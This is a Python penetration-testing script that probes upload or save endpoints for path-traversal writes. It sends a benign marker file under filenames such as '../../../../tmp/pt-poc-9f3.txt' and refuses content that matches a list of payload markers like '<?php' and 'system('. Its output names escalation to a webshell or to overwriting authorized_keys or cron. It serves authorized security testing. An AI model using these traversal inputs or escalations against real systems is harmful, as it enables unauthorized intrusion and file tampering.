#!/usr/bin/env python3
"""
write_probe.py - upload/save path-traversal WRITE prober (benign).
Submits a benign, uniquely-named marker to an upload/save endpoint with a TRAVERSING filename/dest, so you can
then check whether the file landed OUTSIDE the intended directory (write-traversal). It sends the request and
tells you exactly what to verify - it does NOT drop a shell and refuses executable-looking content.

Prove the ESCAPE with a benign marker; describe the webshell/overwrite -> RCE; only weaponize on your OWN test
instance; never overwrite real files on prod (PATH_TRAVERSAL_TESTING_GUIDE.md section 13/14/20). Authorized only.

Usage:
  # multipart upload where the filename is honored:
  python3 write_probe.py -u https://target/upload --field file --filename "../../../../tmp/pt-poc-9f3.txt"
  # a JSON body with a dest/path field:
  python3 write_probe.py -u https://target/api/save --json --path-field dest --filename "../../public/pt-9f3.txt"
  python3 write_probe.py --selftest
"""
import argparse, sys, json as jsonlib

# cp1252-safe console on Windows
try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except Exception:
    requests = None

BANNED = ["<?php", "<?=", "<%", "<script", "#!/", "eval(", "system(", "shell_exec", "subprocess", "os.system"]


def is_traversing(name):
    n = (name or "").replace("\\", "/")
    return n.startswith("/") or ".." in n.split("/") or (len(name) > 1 and name[1] == ":")


def check_content(c):
    low = (c or "").lower()
    for b in BANNED:
        if b in low:
            sys.exit(f"[refused] content looks like a payload ({b!r}). Benign markers only (guide sec 20).")


def selftest():
    cases = [("../../x.txt", True), ("/var/www/x", True), ("C:\\x", True), ("upload.txt", False)]
    ok = True
    for n, exp in cases:
        r = is_traversing(n)
        ok = ok and (r == exp)
        print(f"[{'PASS' if r==exp else 'FAIL'}] is_traversing({n!r}) = {r}")
    banned = any(b in "<?php ?>".lower() for b in BANNED)
    print(f"[{'PASS' if banned else 'FAIL'}] banned-content detector works")
    ok = ok and banned
    print(f"\nSELFTEST: {'PASS' if ok else 'FAIL'}")
    return ok


def main():
    ap = argparse.ArgumentParser(description="Benign upload/save write-traversal prober (authorized).")
    ap.add_argument("-u", "--url", help="upload/save endpoint")
    ap.add_argument("--field", default="file", help="multipart file field name (default 'file')")
    ap.add_argument("--filename", help="traversing filename/dest, e.g. ../../../../tmp/pt-poc-<rand>.txt")
    ap.add_argument("--content", default="path-traversal WRITE PoC (benign marker) - authorized test")
    ap.add_argument("--json", action="store_true", help="send a JSON body instead of multipart")
    ap.add_argument("--path-field", default="path", help="JSON field holding the dest path (with --json)")
    ap.add_argument("--timeout", type=float, default=15)
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()

    if a.selftest:
        sys.exit(0 if selftest() else 1)
    if not a.url or not a.filename:
        ap.error("provide -u <url> and --filename (or --selftest)")
    if requests is None:
        sys.exit("pip install requests")

    check_content(a.content)
    if not is_traversing(a.filename):
        print(f"[warn] {a.filename!r} does not traverse - it won't escape the target dir. Add ../ or an absolute path.")

    print(f"== write-traversal probe: {a.url} ==")
    print(f"   filename/dest : {a.filename}")
    print(f"   content       : {a.content!r} (benign)\n")

    try:
        if a.json:
            body = {a.path_field: a.filename, "content": a.content, "data": a.content}
            r = requests.post(a.url, json=body, timeout=a.timeout, verify=False,
                              headers={"User-Agent": "write-probe (authorized)"})
        else:
            files = {a.field: (a.filename, a.content, "text/plain")}
            r = requests.post(a.url, files=files, timeout=a.timeout, verify=False,
                              headers={"User-Agent": "write-probe (authorized)"})
    except Exception as e:
        sys.exit(f"[err] request failed: {e}")

    print(f"[resp] HTTP {r.status_code}, {len(r.text or '')} bytes")
    snippet = (r.text or "").strip().splitlines()[:3]
    for line in snippet:
        print(f"       {line[:120]}")

    print("\n[verify] The request was sent. Confirm the WRITE-TRAVERSAL by checking where the marker landed:")
    print(f"   - Can you now READ the marker at the OUT-OF-DIR path implied by {a.filename!r}?")
    print("     (e.g. request the served URL if it landed in the webroot, or read it via a read sink.)")
    print("   - If the marker is OUTSIDE the intended upload/save dir -> write-traversal confirmed.")
    print("   - Escalate (own instance only): webshell in webroot / overwrite authorized_keys|cron (sec 13/14).")
    print("   - NEVER overwrite real files on prod; keep the PoC to a benign marker (sec 20).")


if __name__ == "__main__":
    main()
